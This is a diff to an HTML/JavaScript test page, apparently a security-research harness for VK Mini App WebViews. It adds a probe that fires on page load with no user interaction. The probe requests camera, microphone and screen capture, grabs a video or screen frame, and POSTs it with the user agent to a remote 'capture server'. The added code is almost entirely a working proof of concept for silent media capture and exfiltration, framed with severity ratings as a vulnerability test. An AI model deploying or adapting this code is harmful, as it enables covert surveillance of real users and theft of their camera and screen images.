@@ -95,6 +95,18 @@ h2{font-size:17px;font-weight:600;color:#000;margin-bottom:6px}
     <div class="trigger-hint">auxclick event — middle mouse button</div>
   </div>
 
+  <div class="row" style="border-top:2px solid #0077ff;padding-top:12px;margin-top:8px">
+    <div>
+      <div class="rname">M — Raw WebView media (auto, NO gesture) <span class="pill p-run" id="s-media">AUTO</span></div>
+      <div class="rdesc">Fires on page load with zero interaction: enumerateDevices label leak, permissions.query,
+        getUserMedia(video+audio), getDisplayMedia. If granted, captures a frame and exfiltrates it to the capture
+        server. Bypasses VK Bridge entirely — tests the native WebView's own permission config.</div>
+    </div>
+  </div>
+  <video id="vid" autoplay playsinline muted style="width:100%;max-height:200px;border-radius:8px;background:#000;display:none;margin-top:8px"></video>
+  <canvas id="cnv" style="display:none"></canvas>
+
+  <button class="btn btn-go" onclick="mediaProbe('manual')" style="width:100%;margin:10px 0 0;padding:10px">Re-run media probe manually</button>
   <button class="btn btn-go" onclick="copyLog()" style="width:100%;margin:10px 0 0;padding:10px" id="copy-btn">Copy full log to clipboard</button>
   <div id="log"></div>
 </div>
@@ -252,6 +264,118 @@ document.getElementById('box-g5').addEventListener('auxclick', function(e){
   runBattery('G5');
 });
 
+// ── Raw WebView media probe — no VK Bridge, no gesture ────────────────────────
+async function sendFrame(stream, label){
+  try{
+    const vid = document.getElementById('vid');
+    vid.srcObject = stream;
+    vid.style.display = 'block';
+    await new Promise(r => { vid.onloadedmetadata = r; setTimeout(r, 1500); });
+    await vid.play().catch(()=>{});
+    await new Promise(r => setTimeout(r, 600)); // let a real frame arrive
+    const cnv = document.getElementById('cnv');
+    cnv.width = vid.videoWidth || 640;
+    cnv.height = vid.videoHeight || 480;
+    cnv.getContext('2d').drawImage(vid, 0, 0, cnv.width, cnv.height);
+    const dataUrl = cnv.toDataURL('image/jpeg', 0.6);
+    lg(`${label}: FRAME CAPTURED ${cnv.width}x${cnv.height} (${Math.round(dataUrl.length/1024)}KB)`, 'crit');
+    if(SRV){
+      const base = SRV.replace(/\/log$/, '');
+      await fetch(base + '/frame?label=' + encodeURIComponent(label), {
+        method:'POST',
+        headers:{'Content-Type':'application/json','ngrok-skip-browser-warning':'true'},
+        body: JSON.stringify({label, w:cnv.width, h:cnv.height, jpeg:dataUrl, ua:navigator.userAgent, _ts:Date.now()})
+      });
+      lg(`${label}: frame EXFILTRATED to capture server`, 'crit');
+      post('MEDIA_FRAME_SENT', {label, w:cnv.width, h:cnv.height, bytes:dataUrl.length});
+    } else {
+      lg(`${label}: frame captured but no capture server set — set the field above to exfiltrate`, 'warn');
+    }
+  }catch(e){
+    lg(`${label}: frame capture failed — ${e.name}: ${e.message}`, 'err');
+    post('MEDIA_FRAME_FAIL', {label, error:e.name, message:e.message});
+  }
+}
+
+async function mediaProbe(trigger){
+  pill('s-media', 'PROBING', 'p-run');
+  lg(`MEDIA probe start (trigger=${trigger}) — no gesture, no VK Bridge`, 'warn');
+  post('MEDIA_PROBE_START', {trigger});
+
+  // 1. enumerateDevices — non-empty labels means permission is ALREADY granted to this origin
+  try{
+    const devs = await navigator.mediaDevices.enumerateDevices();
+    const labelled = devs.filter(d => d.label);
+    lg(`enumerateDevices: ${devs.length} devices, ${labelled.length} WITH LABELS`, labelled.length ? 'crit' : 'warn');
+    labelled.forEach(d => lg(`  [${d.kind}] ${d.label}`, 'crit'));
+    post('MEDIA_ENUMERATE', {
+      total: devs.length, labelled: labelled.length,
+      labels: labelled.map(d=>({kind:d.kind, label:d.label})),
+      note: labelled.length ? 'LABELS PRESENT = media permission already granted to this origin without any prompt' : 'no labels = not pre-granted'
+    });
+  }catch(e){ post('MEDIA_ENUMERATE_FAIL', {error:e.name, message:e.message}); }
+
+  // 2. permissions.query — what does the WebView think the state is?
+  for(const name of ['camera','microphone','geolocation']){
+    try{
+      const p = await navigator.permissions.query({name});
+      lg(`perm[${name}]: ${p.state}`, p.state==='granted' ? 'crit' : 'warn');
+      post('MEDIA_PERM_STATE', {name, state:p.state});
+    }catch(e){ post('MEDIA_PERM_NA', {name, error:e.name}); }
+  }
+
+  // 3. getUserMedia — the actual test. <400ms with a stream = no dialog was shown.
+  for(const [key, constraints] of [
+    ['CAM+MIC', {video:true, audio:true}],
+    ['CAM',     {video:true, audio:false}],
+    ['MIC',     {video:false, audio:true}],
+  ]){
+    const t0 = Date.now();
+    try{
+      const stream = await navigator.mediaDevices.getUserMedia(constraints);
+      const ms = Date.now() - t0;
+      const v = stream.getVideoTracks(), a = stream.getAudioTracks();
+      const verdict = ms < 400 ? 'NO DIALOG — SILENT GRANT' : ms < 1500 ? 'FAST — verify if dialog appeared' : 'dialog likely shown';
+      lg(`!! getUserMedia(${key}) GRANTED in ${ms}ms — ${verdict}`, 'crit');
+      v.forEach(t => lg(`  [video] ${t.label}`, 'crit'));
+      a.forEach(t => lg(`  [audio] ${t.label}`, 'crit'));
+      pill('s-media', 'GRANTED!!', 'p-ok');
+      post('MEDIA_GUM_GRANTED', {
+        key, elapsed_ms: ms, verdict,
+        videoLabels: v.map(t=>t.label), audioLabels: a.map(t=>t.label),
+        severity: ms < 400 ? 'CRITICAL — silent media access, no gesture, no dialog' : 'HIGH — verify dialog',
+        finding: `getUserMedia(${key}) granted in VK Mini App WebView after ${trigger}, ${ms}ms`
+      });
+      if(v.length) await sendFrame(stream, key);
+      stream.getTracks().forEach(t=>t.stop());
+      document.getElementById('vid').style.display = 'none';
+      return; // one success is enough
+    }catch(e){
+      const ms = Date.now() - t0;
+      lg(`getUserMedia(${key}): ${e.name} — ${e.message} (${ms}ms)`, 'err');
+      post('MEDIA_GUM_DENIED', {key, elapsed_ms: ms, error:e.name, message:e.message});
+    }
+  }
+
+  // 4. getDisplayMedia — the Telegram P0 vector
+  const t1 = Date.now();
+  try{
+    const stream = await navigator.mediaDevices.getDisplayMedia({video:true});
+    const ms = Date.now() - t1;
+    lg(`!! getDisplayMedia GRANTED in ${ms}ms — ${stream.getVideoTracks()[0]?.label}`, 'crit');
+    post('MEDIA_GDM_GRANTED', {elapsed_ms: ms, label: stream.getVideoTracks()[0]?.label,
+      severity:'CRITICAL', finding:`getDisplayMedia granted in VK Mini App WebView, ${ms}ms`});
+    await sendFrame(stream, 'SCREEN');
+    stream.getTracks().forEach(t=>t.stop());
+  }catch(e){
+    lg(`getDisplayMedia: ${e.name} — ${e.message}`, 'err');
+    post('MEDIA_GDM_DENIED', {error:e.name, message:e.message, elapsed_ms: Date.now()-t1});
+  }
+
+  pill('s-media', 'done', 'p-block');
+  lg('MEDIA probe complete', 'warn');
+}
+
 async function boot(){
   detectEnv();
   let tries = 0;
@@ -260,6 +384,8 @@ async function boot(){
   const ok = await vkInit();
   lg('G4 ARMED — first mouse movement fires the full VK Bridge battery', 'crit');
   lg('G1/G5: right-click or middle-click the boxes; G2: type in the field; G3: click Run', 'warn');
+  // AUTO-FIRE with zero user interaction — this is the actual no-gesture test
+  mediaProbe('page-load-no-gesture');
   if(!ok) lg('vkBridge.send(VKWebAppInit) did not resolve OK — check the capture-server URL field above is set if you want remote logging; the on-page log always works regardless', 'err');
 }
 boot();
